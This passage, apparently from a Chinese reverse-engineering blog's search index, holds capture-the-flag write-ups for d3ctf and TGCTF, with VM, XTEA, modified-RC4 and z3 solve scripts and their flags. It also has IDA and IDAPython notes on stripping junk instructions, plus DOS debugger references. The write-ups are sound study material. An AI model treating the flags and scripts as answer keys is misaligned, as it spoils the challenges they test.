ip += 1                nlocals_op = self.code[ip]                ip += 1                                new_context = NewStack(ip)                if nlocals_op &gt; 100: return False                for i in range(nargs):                    new_context.locals[i] = self.stack[len(self.stack) - 1 - i] # 转移参数到新栈帧                                self.stack = self.stack[:-nargs] # 弹出参数                self.call_stack.append(new_context)                ip = func_addr                        elif opcode == opcodes[&quot;RET&quot;]:                last_context = self.call_stack.pop()                ip = last_context.return_ip                        elif opcode == opcodes[&quot;SMC&quot;]:                change_code_val = self.code[ip]                ip += 1                smc(self, ip, change_code_val)                        else:                print(f&quot;VM Error: Unknown opcode &#123;opcode&#125; at IP &#123;ip-1&#125;.&quot;)                return False # 未知操作码，执行失败            if ip &lt; self.code_size:                opcode = self.code[ip]            else:                break        return Truedef py_int_handler(vm_instance, next_ip, value):    if 0 &lt;= next_ip &lt; vm_instance.code_size:        vm_instance.code[next_ip] += value    else:        print(&quot;error&quot;)    return 0def to_signed32(val):    val &amp;= 0xFFFFFFFF    if val &amp; 0x80000000: # 最高位为1，表示负数        return val - 0x100000000    return valdef main():    opc_hex_values = [        0x0000000a,0x00000000,0x00000018,0x005801c0,0xffa7fe4e,0x00000000,0x0000000a,0x00000000,        0x00000018,0x20160070,0xdfe9ff9e,0x00000001,0x0000000a,0x00000000,0x00000018,0x4805801c,        0xb7fa7ff2,0x00000002,0x0000000a,0x00000000,0x00000018,0x12016007,0xedfea007,0x00000003,        0x0000000a,0x00000064,0x00000018,0x04805801,0xfb7fa80d,0x00000004,0x0000000c,0x0000000a,        0x0000000c,0x00000000,0x00000005,0x00000008,0x0000004c,0x0000000a,0x0000000a,0x0000000c,        0x00000000,0x00000001,0x00000016,0x0000000e,0x00000002,0x0000000a,0x0000000b,0x0000000c,        0x00000000,0x00000001,0x00000016,0x0000000e,0x00000003,0x0000000c,0x00000002,0x0000000c,        0x00000003,0x00000004,0x00000017,0x00000004,0x0000000c,0x00000000,0x0000000a,0x00000001,        0x00000001,0x0000000e,0x00000000,0x0000000c,0x00000004,0x0000000a,0x00000001,0x00000001,        0x0000000e,0x00000004,0x00000007,0x0000001e,0x00000012,0xffffc588,0x00000000,0x55555555,        0x00000150,0x00000150,0x00000000,0x00000000,0x00000006,0x00000000,0x00000000,0x00000000    ]    bytecode = [to_signed32(x) for x in opc_hex_values] # 将字节码转换为有符号32位整数，在smc中使用到了，原字节码也是int类型的    input_string = (string.ascii_uppercase+ string.ascii_lowercase)[:36:]    vm_instance = VM()    vm_instance.globals = [0] * 1000    vm_instance.globals[10] = 36 # 数据长度    for i in range(min(len(input_string), 36)):        if (i + 1) &lt; len(vm_instance.globals):            vm_instance.globals[i + 11] = ord(input_string[i]) # 读取输入到global中    vm_instance.set_code(bytecode, len(bytecode)) # 设置字节码    success = vm_instance.vm_exec(start_ip=0, smc=py_int_handler)    if success:        print(&quot;\\nsuccess&quot;)    else:        print(&quot;\\nfailed&quot;)if __name__ == &quot;__main__&quot;:    main()\n\n模拟执行并进行打印，大概可以看出是前一位异或后一位。最后的判断逻辑是先判断用户名再判断passwd，两者的加密方法是相同的。\n但是这样来说最后的密文应该只有35位，可现实是36位，不难发现，其实字符长度36也参与了异或运算。\n如果没有想到第一位是36，可以先忽略第一个字节把后面的字节进行前后异或解密，再用结果去爆破一下即可，因为缺的只是第一位，而异或是有连续性的，只需要全部再异或某一个字节就行。这里用cyber chef的xor brute force解密。结果证明这个字节是24。\n密文如下，解密就行\ndata = [0x45,0x57,0xE,0x5C,0x2,0x4,0x52,0x6,0x1B,0x1A,0xE,0x1,0x5E,0x4B,0x19,0x56,0x6,0x55,0x1C,0x14,0x5C,0x5D,0x9,0x1C,0x1D,0x1,0x0,0x50,0x0,0x4,0x6,0x52,0x0,0x2,0x55,0x56,0x6A,0x4,0x1D,0x7,0x6,0x1D,0x9]passwd = data[:36:]res = [0]*37res[0] =36 #补回第一位for i in range(1,37):    res[i] = data[i-1] ^ res[i-1]flag = &quot;&quot;.join(chr(i) for i in res)print(flag)#d3ctf&#123;a68dfb06-798f-4bd1-9e81-011aaec113f0&#125;\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"DOS程序逆向学习","url":"/2025/03/13/DOS%E7%A8%8B%E5%BA%8F/","content":"Dos常用命令参考\ndir #查看目录cd \t#切换目录d:\t#切换盘符到dmd\t#新建目录rmdir\t#删除目录rmdir /s\t#删除非空目录xcopy /e [source] [destination]\t#复制文件move [sourcr] [destination] #移动文件ren [oldname] [newname]\t#重命名type nul&gt;[name].xxx\t#创建空文件echo [content]&gt;[filename]\t#新建非空文件echo [content]&gt;&gt;[filname]\t#追加文件内容type [filename]\t#查看文件del [filename]\t#删除文件start /d &quot;[path]&quot;[exename] #启动程序explorer #打开文件管理器ipconfig #查看ip地址mount c [filepath] #挂载文件夹到c盘\n\n编译并运行程序参考\n1.下载Turboc2，并创建目录，用mount挂载\n2.创建.c文件放到挂载目录下\n3.在挂载盘中找到Turboc2并进入文件夹\n4.运行tc，在file下load c文件，按f9编译，退出输入程序exe名即可运行\n编译并运行汇编程序参考\n使用MASM编译。\n改汇编代码文件后缀为.asm\nmasm [filename].asmlink [filename].obj\n\n调试程序参考\n命令\n参考\nA [地址] 输入汇编指令C [范围] 起始地址 对由“范围”指定的区域与“起始地址”指定的同大小区域进行比较，显示不相同的单元D [范围] 显示指定范围内的内存单元内容E 地址 字节值表 用值表中的值替换从“地址”开始的内存单元内容F 范围 字节值表 用指定的字节值表来填充内存区域G [&#x3D;起始地址] [断点地址] 从起点（或当前地点）开始执行，到终点结束H 数值1 数值2 显示两个十六进制数值之和、差I 端口地址 从端口输入L [地址 [驱动器号 扇区 扇区数]] 从磁盘读取数据M 范围 地址 把“范围”内的字节值传送到从“地址”开始的单元N 文件标识符 [文件标识符…] 指定文件名，为读&#x2F;写文件做准备O 端口地址 字节值 向端口输出数据P [&#x3D;地址] [指令数] 按执行过程，但不进入子程序调用或软中断Q 退出 DEBUG，不保存正在调试的文件R [寄存器名] 显示和修改寄存器内容S 范围 字节值表 在内存区域内搜索指定的字节值表。如果找到，显示起始地址，否则不显示任何内容T [&#x3D;地址] [指令数] 跟踪执行，从起点（或当前地点）执行若干条指令U [范围] 反汇编，显示机器码所对应的汇编指令W [地址 [驱动器号 扇区 扇区数]] 向磁盘写内容，（BX、CX）为写入字节数  \n在ida中查看地址\n\nhello world字符被加载到ax打印，数据在cs:0200被存储，我们直接用t 201运行到位置后的位置。然后查看AX的值，定位到AX指向的位置用d 194查看内存。\n\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"IDA的一些用法笔记","url":"/2025/01/21/IDA%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","content":"常用快捷键11、切换文本视图与图表视图 空格键\n2、返回上一个操作地址 ESC\n3、搜索地址和符号 G\n4、对符号进行重命名 N\n5、常规注释 冒号键\n6、可重复注释 分号键\n7、添加标签 Alt+M\n8、查看标签 Ctrl+M\n9、查看段的信息 Ctrl+S\n10、查看交叉应用 X\n11、查看伪代码 F5\n12、搜索文本 Alt+T\n13、搜索十六进 Alt+B\n2a：将数据转换为字符串\nf5：一键反汇编\nesc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）\nshift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置\nctrl+w：保存ida数据库\nctrl+s：选择某个数据段，直接进行跳转\nctrl+鼠标滚轮：能够调节流程视图的大小\nr：把大数转为字符串\nx：对着某个函数、变量按该快捷键，可以查看它的交叉引用\ng：直接跳转到某个地址\nn：更改变量的名称\ny：更改变量的类型\n&#x2F; ：在反编译后伪代码的界面中写下注释\n\\在反编译后伪代码的界面中隐藏&#x2F;显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多\n；：在反汇编后的界面中写下注释\nctrl+shift+w：拍摄IDA快照\nu：undefine，取消定义函数、代码、数据的定义\n动态调试快捷键F2：下断点\nF3：打开程序\nF4：运行到当前光标处（可应用在跳出 循坏）\nF7：单步步入（进函数）\nF8：单步 步过\nF9；运行\nF10：打开反汇编选项菜单快捷键\nF12:暂时停止\nCtrl+F2：重新开始\nArt+F2：结束跟踪\nShift+F2：打开附加选项窗口\nShift+F4：打开条件对话窗\nShift+F7：与F7相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步入被调试程序指定的异常处理\nCtrl+F7：自动步入，在所有的函数调用中一条一条地执行命令，断点或异常时，自动 停止\nShift+F8与F8相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步过被调试程序指定的异常处理\nCtrl+F8：自动步过，一条一条的执行命令，程序到达断点，或者发生异常时，自动步过过程都会停止\nShift+F9：与F9相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理\nCtrl+F9:执行直到返回，跟踪程序直到遇到返回，在此期间不进入子函数也不更新CPU数据。因为程序是一条一条命令执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。\nAlt+F9:执行直到返回到用户代码段，跟踪程序直到指令所属于的模块不在系统目录中，在此期间不进入子函数也不更新CPU数据。按Esc键，可以停止跟踪。\nCtrl+F11:Run跟踪步入，一条一条执行命令，进入每个子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。\nCtrl+F12 :Run跟踪。步过，一条一条执行命令，但是不进入子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。\nArt+C:快速回到主界面\nAlt+B:显示断点窗口\nAlt+E:显示模块窗口\nArt+L:显示记录窗口\nAlt+M:显示内存窗口\nAlt+O:显示调试选项窗口\nAlt+K:显示呼叫堆栈\nCtrl+E:编辑机器码\nCtrl+G:输入跟随地址\nCtrl+N:查找名称标志，选择你要下断的内容\nCtrl+S:打开查找命令次序窗口\nCtrl+P:显示补丁窗口\nCtrl+F9:返回到跟踪\nCtrl+F8:自动步进扫描，按F12可停止\nCtrl+F7:同上，功能略有不同\nCtrl+F6:回到OL主窗口\n(可能有些已经不适用ida9了)\n实用功能下面的ida环境为ida9和windows。\n在ida的Options中有一个show command palette(快捷键ctrl+shift+p)，里面可以搜索使用ida的全部功能，在接下来的功能中我们以”@功能名”的形式介绍，您可以通过功能名搜索到功能直接使用。\n拍摄快照@Take database snapshot  拍摄当前数据库快照，可用@Database snapshot manager恢复快照\n创建结构体结构体的作用\n我们会在ida中遇见类似”a1 + 1”,”a1 + 3”,……的变量，这个时候我们可以把类似的变量名整理成一个结构体，结果会以结构体中的元素索引（结构体中元素的偏移量）与a1后面的偏移量匹配。结构体中的元素偏移量与结构体中的元素变量类型的大小有关，假如结构体的第一个元素大小为1字节，那么第二个元素的偏移量就是1，如果第二个元素的大小为4字节，那么第三个元素的索引为5，以此类推。通过对结构体命名来对变量进行命名，这可以大大提高代码的可读性。\n在@Local Types窗口中我们可以右键选择Add type以创建一个结构体（c语言格式）。在创建的结构体里按D键可以创建元素，多按几次可以改变，对元素名按N可以重命名。在要创建结构体的变量右键选择Structure offset(@Offset(struct))以匹配结构体。在函数参数右键选择con to struct*以创建结构体指针。对数据右键选择Structure创建一个结构体数组，再右键选择@Array创建合适大小的数组，以生成结构体数组。\n","categories":["工具"],"tags":["re,工具"]},{"title":"IDApython的初步学习","url":"/2024/12/21/IDApython/","content":"\nida版本为IDA9.0\n\n用VScode编写IDApython\n找到这个项目IDAcode,把下来的文件加到你ida的plugins文件夹中。\n修改idacode_utils&#x2F;settings.py中的PYTHON路径为本地的python路径\n在本地中用控制台安装依赖\n\npython -m pip install --user debugpy tornado\n\n在VScode中安装IDAcode插件\n在VScode按CTRL+Shift+P输入”Open User Settings(JSON)”打开后添加如下代码。\n\n&quot;python.autoComplete.extraPaths&quot;: [        &quot;E:\\\\CTFtoolsNEW\\\\Reverse\\\\IDA90\\\\python\\\\3&quot;   //你的ida库路径     ],     &quot;python.analysis.extraPaths&quot;: [        &quot;E:\\\\CTFtoolsNEW\\\\Reverse\\\\IDA90\\\\python\\\\3&quot;   //你的ida库路径   ],\n\n在VScode按CTRL+Shift+P，搜索ida即可找到想要的功能。\n在ida插件中打开idacode，显示Listening on 127.0.0.1:7065即成功。\n如果出现找不到依赖的报错，请在ida目录下找到并运行idapyswitch.exe，选择同样的python解释器(切换解释器可能会导致库的缺失，请自行安装缺失的库)。\n如果写的命令发到ida执行报错，请在VScode中选择同样的python解释器，不要用虚拟解释器。\n\n\n[!NOTE]\n在ida9中idc库似乎有些内容被弃用，我们可以用ida_ida库实现相同的功能。官方也说明了idc库中的某些内容可能在将来的版本中被弃用。”This file is subject to change without any notice. Future versions of IDA may use other definitions.”\n[]: https://python.docs.hex-rays.com/namespaceidc.html\t“hex-rays”\n对于一些ida90的兼容性问题可参考: https://www.52pojie.cn/thread-1957552-1-1.html\n\n脚本总结模板去花指令import idautilsimport idcimport idaapidef nop_jzjnz(start_addr,endaddr,pattern):    length =len(pattern)    flag = 0    while start_addr &lt; endaddr:        getbytes =idc.get_bytes(start_addr,length) #获取指定范围内指定地址的字节码并返回成列表        if(getbytes[0]==pattern[0] and getbytes[2]==pattern[2] and getbytes[4] == pattern[4] ):  #匹配花指令模板            flag = 1            for i in range(length):                        idc.patch_byte(start_addr + i,0x90)  #nop            print(f&quot;success! nop 0x&#123;hex(start_addr)&#125; to 0x&#123;hex(start_addr + length -1)&#125; length:&#123;length&#125;&quot;)            start_addr += length - 1        start_addr += 1    if(flag == 0):        print(&quot;Not find!!!&quot;)        def nop_range(start_addr,end_addr):    while(start_addr &lt;= end_addr):        idc.patch_byte(start_addr,0x90)        start_addr += 1    print(f&quot;success! nop 0x&#123;start_addr&#125; to 0x&#123;end_addr&#125;&quot;)def remount(): #重建光标所指内的函数    try:        addr = idc.get_screen_ea()        func = idaapi.get_func(addr)        func_start = func.start_ea        idaapi.del_func(func_start)        idaapi.add_func(func_start)        print(f&quot;success!! remount the func in 0X&#123;func&#125;&quot;)    except Exception as a:        print(&quot;some errors occur, remount falrue&quot;)        print(f&quot;error : &#123;a&#125;&quot;)start_addr = 0x0401020   end_addr = 0x040122F    pattern_jzjnz1 = [0x74, 0x00, 0x75, 0x00, 0xE8] # callpattern_jzjnz2 = [0x74, 0x00, 0x75, 0x00, 0xE9] # jmp#nop_jzjnz(start_addr,end_addr,pattern_jzjnz1)#nop_range(0x04010C3,0x04010CB)#remount()\n\n获取寄存器import ida_dbgecx = ida_dbg.get_reg_val(&quot;ecx&quot;)print(&quot;,&quot;,ecx,end=&quot;&quot;)#在断点处右键edit用三个点输入脚本以dump寄存器的值\n\n一些函数idc.get_bytes() #获取指定范围内指定地址的字节码并返回成列表idc.patch_byte()  #修改地址字节码idaapi.get_func(addr) #输入一个在函数内的地址，返回一个函数对象，包含了函数的各种信息，可用dir()查看可用属性idaapi.del_func(func_start) #输入地址，删除一个函数idaapi.add_func(func_start) #输入地址，建立一个函数\n\n","categories":["工具"],"tags":["re,工具"]},{"title":"2025TGCTF Re-Wp+复现","url":"/2025/04/25/TGctf2025/","content":"base64表右移24位\nXTEA大端序密文输入。\ndelta没给，直接爆破0—&gt;0xffffffff\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;stdlib.h&gt;void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4],uint32_t delta) &#123;    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], sum = 0,a,b,c    ;        for (i = 0; i &lt; num_rounds; i++) &#123;    /*  printf(&quot;%x,%x,%x\\n&quot;, v0, v1,sum);*/        a = (v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5);        //printf(&quot;%x\\n&quot;, a);        b = a+v1;        c = sum + key[sum &amp; 3];        v0 += ( b^ c);        sum -= delta;        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);    &#125;    v[0] = v0; v[1] = v1;&#125;void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4],uint32_t delta) &#123;    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], sum = delta * num_rounds ;    sum = 0;    for (int j = 0; j &lt; 32; j++) sum -= delta;    for (i = 0; i &lt; num_rounds; i++) &#123;        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);        sum += delta;        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);            &#125;    v[0] = v0; v[1] = v1;&#125;int main() &#123;    uint32_t v[8] = &#123; 0x8CCB2324, 0x09A7741A, 0xFB3C678D, 0xF6083A79, 0xF1CC241B, 0x39FA59F2, 0xF2ABE1CC, 0x17189F72 &#125;;    uint32_t k[4] = &#123; 0x000019F8, 0x000011BE, 0x00000991, 0x00003418 &#125;;    srand(2024);    uint32_t v2[4] = &#123;0&#125;;    char flag[] = &quot;HZNUCTF&#123;&quot;;    //for (int i = 0; i &lt; 4; i++) &#123;    //  k[i] = rand();    //&#125;    uint32_t delta = 0;    for (uint32_t j = 0; j &lt; 0xffffffff; j++) &#123;        v2[0] = 0x485a4e55;        v2[1] = 0x4354467b;        encipher(32, v2, k,j);        if (v2[0] == v[0]) &#123;            delta = j;            printf(&quot;%d\\n&quot;, j);        &#125;    &#125;    printf(&quot;\\n&quot;);    unsigned int r = 32;                for (int i = 6; i &gt;=0; i--) &#123;        decipher(r, &amp;v[i], k, delta);    &#125;    for (int i = 0; i &lt; 32; i++) &#123;        printf(&quot;%c&quot;, *((char*)v + i));    &#125;    return 0;&#125;\n\n最后手动把四字节反转一下\nHZNUCTF&#123;ae6-9f57-4b74-b423-98eb&#125;\n\nconforand混淆成一坨了，把seed改为1后动调+盯帧查看数据变化和加密逻辑。\n魔改rc4，魔改了下面的部分。\n时间戳作为种子生成随机数（delta）对密钥进行了异或加密。\n加密时盒交换就交换了一次，详情看下面的脚本。\n解密时对随机数进行爆破再异或密钥解密魔改rc4就行。\n#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt;#include&lt;string.h&gt;//s 表的长度取 256#define size 257unsigned char sbox[257] = &#123; 0 &#125;;// 初始化 s 表void init_sbox(unsigned char* key,unsigned int delta) &#123;    unsigned int i, j, k;    int tmp;    unsigned char keyt[257] = &#123; 0 &#125;;    //int delta = 0x6B8B4567;    for (i = 0; i &lt; size; i++) &#123;        sbox[i] = i;        keyt[i] = (key[i % 9] ^ delta) % 256;     &#125;    j =k = 0;    for (i = 0; i &lt; size; i++) &#123;        tmp = sbox[i];        j = (j + tmp + keyt[i]) % 257;          //printf(&quot;%x,&quot;, j);        sbox[i] = sbox[j];        sbox[j] = tmp;        /*if (++k &gt;= 12)            k = 0;*/    &#125;    //printf(&quot;\\n&quot;);&#125;// 加解密函数void enc_dec(unsigned char* key, unsigned char* data,unsigned int delta) &#123;    int i, j, k, R, tmp;    init_sbox(key,delta);    //printf(&quot;R:\\n&quot;);    j = k = 0;    for (i = 0; i &lt; strlen((char*)data); i++) &#123;        j = (j + 1) % size;        k = (k + sbox[j]) % size;        tmp = sbox[j];        sbox[j] = sbox[k];        //sbox[k] = tmp;        int a, b, c;        a = (sbox[j]);        b = sbox[k];        c = a + b;        /*for (int i = 0; i &lt; 256; i++) &#123;            printf(&quot;0x%x,&quot;, sbox[i]);        &#125;*/        R = sbox[c % size];        //printf(&quot;%x,&quot;, R);        data[i] ^= R;    &#125;&#125;int main() &#123;    unsigned char key[100] =&quot;JustDoIt!&quot;;    unsigned char data[100] = &quot;000000000000000000000000000000000000000000&quot;;    unsigned char mm[100] = &#123; 0x83,0x1e,0x9c,0x48,0x7a,0xfa,0xe8,0x88,0x36,0xd5,0x0a,0x08,0xf6,0xa7,0x70,0x0f,0xfd,0x67,0xdd,0xd4,0x3c,0xa7,0xed,0x8d,0x51,0x10,0xce,0x6a,0x9e,0x56,0x57,0x83,0x56,0xe7,0x67,0x9a,0x67,0x22,0x24,0x6e,0xcd,0x2f &#125;;    unsigned char flag[] = &quot;HZNUCTF&#123;&#125;&quot;;    unsigned char tmp[100];    tmp[42] = &#x27;\\0&#x27;;    for (unsigned int i = 0; i &lt; 0xffffffff; i++) &#123;  //爆破随机数        for (int j = 0; j &lt; 42; j++) &#123;            tmp[j] = mm[j];        &#125;        enc_dec(key, tmp,i);        if (tmp[0] == flag[0] &amp;&amp; tmp[1] == flag[1] &amp;&amp;tmp[2] == flag[2] &amp;&amp; tmp[3] == flag[3])        &#123;            printf(&quot;delta:%d\\n&quot;, i);            for (int i = 0; i &lt; 42; i++) &#123;                printf(&quot;0x%x,&quot;, mm[i]);            &#125;            break;        &#125;    &#125;    printf(&quot;\\n%s&quot;, tmp);    return 0;&#125;\n\n\n\n蛇年的本命语言z3解一下。\nfrom z3 import *s = Solver()i11i1Iii1I1 =list(Int(f&quot;a_&#123;i&#125;&quot;) for i in range(30))ii1iIi1i11i = [    7 * i11i1Iii1I1[0] == 504,    9 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] == 403,    (2 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1]) + 10 * i11i1Iii1I1[2] == 799,    3 * i11i1Iii1I1[0] + 8 * i11i1Iii1I1[1] + 15 * i11i1Iii1I1[2] + 20 * i11i1Iii1I1[3] == 2938,    (5 * i11i1Iii1I1[0] + 15 * i11i1Iii1I1[1] + 20 * i11i1Iii1I1[2] - 19 * i11i1Iii1I1[3]) + 1 * i11i1Iii1I1[4] == 2042,    (7 * i11i1Iii1I1[0] + 1 * i11i1Iii1I1[1] + 9 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3]) + 2 * i11i1Iii1I1[4] + 5 * i11i1Iii1I1[5] == 1225,    11 * i11i1Iii1I1[0] + 22 * i11i1Iii1I1[1] + 33 * i11i1Iii1I1[2] + 44 * i11i1Iii1I1[3] + 55 * i11i1Iii1I1[4] + 66 * i11i1Iii1I1[5] - 77 * i11i1Iii1I1[6] == 7975,    ((21 * i11i1Iii1I1[0] + 23 * i11i1Iii1I1[1] + 3 * i11i1Iii1I1[2] + 24 * i11i1Iii1I1[3] - 55 * i11i1Iii1I1[4]) + 6 * i11i1Iii1I1[5] - 7 * i11i1Iii1I1[6]) + 15 * i11i1Iii1I1[7] == 229,    (2 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 13 * i11i1Iii1I1[2] + 0 * i11i1Iii1I1[3] - 65 * i11i1Iii1I1[4]) + 15 * i11i1Iii1I1[5] + 29 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] + 20 * i11i1Iii1I1[8] == 2107,    (10 * i11i1Iii1I1[0] + 7 * i11i1Iii1I1[1] + -9 * i11i1Iii1I1[2] + 6 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] + 22 * i11i1Iii1I1[6] + 21 * i11i1Iii1I1[7] - 22 * i11i1Iii1I1[8]) + 30 * i11i1Iii1I1[9] == 4037,    (15 * i11i1Iii1I1[0] + 59 * i11i1Iii1I1[1] + 56 * i11i1Iii1I1[2] + 66 * i11i1Iii1I1[3] + 7 * i11i1Iii1I1[4] + 1 * i11i1Iii1I1[5] - 122 * i11i1Iii1I1[6]) + 21 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 3 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10] == 4950,    (((13 * i11i1Iii1I1[0] + 66 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 39 * i11i1Iii1I1[3] - 33 * i11i1Iii1I1[4]) + 13 * i11i1Iii1I1[5] - 2 * i11i1Iii1I1[6]) + 42 * i11i1Iii1I1[7] + 62 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10]) + 11 * i11i1Iii1I1[11] == 12544,    (((23 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] + 29 * i11i1Iii1I1[2] + 3 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4]) + 63 * i11i1Iii1I1[5] - 25 * i11i1Iii1I1[6]) + 2 * i11i1Iii1I1[7] + 32 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 10 * i11i1Iii1I1[10]) + 11 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12] == 6585,    ((((223 * i11i1Iii1I1[0] + 6 * i11i1Iii1I1[1] - 29 * i11i1Iii1I1[2] - 53 * i11i1Iii1I1[3] - 3 * i11i1Iii1I1[4]) + 3 * i11i1Iii1I1[5] - 65 * i11i1Iii1I1[6]) + 0 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 1 * i11i1Iii1I1[9] - 15 * i11i1Iii1I1[10]) + 16 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12]) + 13 * i11i1Iii1I1[13] == 6893,    ((((29 * i11i1Iii1I1[0] + 13 * i11i1Iii1I1[1] - 9 * i11i1Iii1I1[2] - 93 * i11i1Iii1I1[3]) + 33 * i11i1Iii1I1[4] + 6 * i11i1Iii1I1[5] + 65 * i11i1Iii1I1[6] + 1 * i11i1Iii1I1[7] - 36 * i11i1Iii1I1[8]) + 0 * i11i1Iii1I1[9] - 16 * i11i1Iii1I1[10]) + 96 * i11i1Iii1I1[11] - 68 * i11i1Iii1I1[12]) + 33 * i11i1Iii1I1[13] - 14 * i11i1Iii1I1[14] == 1883,    (((69 * i11i1Iii1I1[0] + 77 * i11i1Iii1I1[1] - 93 * i11i1Iii1I1[2] - 12 * i11i1Iii1I1[3]) + 0 * i11i1Iii1I1[4] + 0 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 16 * i11i1Iii1I1[7] + 36 * i11i1Iii1I1[8] + 6 * i11i1Iii1I1[9] + 19 * i11i1Iii1I1[10] + 66 * i11i1Iii1I1[11] - 8 * i11i1Iii1I1[12]) + 38 * i11i1Iii1I1[13] - 16 * i11i1Iii1I1[14]) + 15 * i11i1Iii1I1[15] == 8257,    ((((23 * i11i1Iii1I1[0] + 2 * i11i1Iii1I1[1] - 3 * i11i1Iii1I1[2] - 11 * i11i1Iii1I1[3]) + 12 * i11i1Iii1I1[4] + 24 * i11i1Iii1I1[5] + 1 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] + 14 * i11i1Iii1I1[8] - 0 * i11i1Iii1I1[9]) + 1 * i11i1Iii1I1[10] + 68 * i11i1Iii1I1[11] - 18 * i11i1Iii1I1[12]) + 68 * i11i1Iii1I1[13] - 26 * i11i1Iii1I1[14]) + 15 * i11i1Iii1I1[15] - 16 * i11i1Iii1I1[16] == 5847,    (((((24 * i11i1Iii1I1[0] + 0 * i11i1Iii1I1[1] - 1 * i11i1Iii1I1[2] - 15 * i11i1Iii1I1[3]) + 13 * i11i1Iii1I1[4] + 4 * i11i1Iii1I1[5] + 16 * i11i1Iii1I1[6] + 67 * i11i1Iii1I1[7] + 146 * i11i1Iii1I1[8] - 50 * i11i1Iii1I1[9]) + 16 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12]) + 69 * i11i1Iii1I1[13] - 27 * i11i1Iii1I1[14]) + 45 * i11i1Iii1I1[15] - 6 * i11i1Iii1I1[16]) + 17 * i11i1Iii1I1[17] == 18257,    ((((25 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] - 89 * i11i1Iii1I1[2]) + 16 * i11i1Iii1I1[3] + 19 * i11i1Iii1I1[4] + 44 * i11i1Iii1I1[5] + 36 * i11i1Iii1I1[6] + 66 * i11i1Iii1I1[7] - 150 * i11i1Iii1I1[8] - 250 * i11i1Iii1I1[9]) + 166 * i11i1Iii1I1[10] + 126 * i11i1Iii1I1[11] - 11 * i11i1Iii1I1[12]) + 690 * i11i1Iii1I1[13] - 207 * i11i1Iii1I1[14]) + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18] == 12591,    (((((5 * i11i1Iii1I1[0] + 26 * i11i1Iii1I1[1] + 8 * i11i1Iii1I1[2] + 160 * i11i1Iii1I1[3] + 9 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5]) + 36 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 15 * i11i1Iii1I1[8] - 20 * i11i1Iii1I1[9]) + 66 * i11i1Iii1I1[10] + 16 * i11i1Iii1I1[11] - 1 * i11i1Iii1I1[12]) + 690 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14]) + 46 * i11i1Iii1I1[15] + 6 * i11i1Iii1I1[16] + 7 * i11i1Iii1I1[17] - 18 * i11i1Iii1I1[18]) + 19 * i11i1Iii1I1[19] == 52041,    ((((((29 * i11i1Iii1I1[0] - 26 * i11i1Iii1I1[1]) + 0 * i11i1Iii1I1[2] + 60 * i11i1Iii1I1[3] + 90 * i11i1Iii1I1[4] - 4 * i11i1Iii1I1[5]) + 6 * i11i1Iii1I1[6] + 6 * i11i1Iii1I1[7] - 16 * i11i1Iii1I1[8] - 21 * i11i1Iii1I1[9]) + 69 * i11i1Iii1I1[10] + 6 * i11i1Iii1I1[11] - 12 * i11i1Iii1I1[12]) + 69 * i11i1Iii1I1[13] - 20 * i11i1Iii1I1[14] - 46 * i11i1Iii1I1[15]) + 65 * i11i1Iii1I1[16] + 0 * i11i1Iii1I1[17] - 1 * i11i1Iii1I1[18]) + 39 * i11i1Iii1I1[19] - 20 * i11i1Iii1I1[20] == 20253,    (((((((45 * i11i1Iii1I1[0] - 56 * i11i1Iii1I1[1]) + 10 * i11i1Iii1I1[2] + 650 * i11i1Iii1I1[3] - 900 * i11i1Iii1I1[4]) + 44 * i11i1Iii1I1[5] + 66 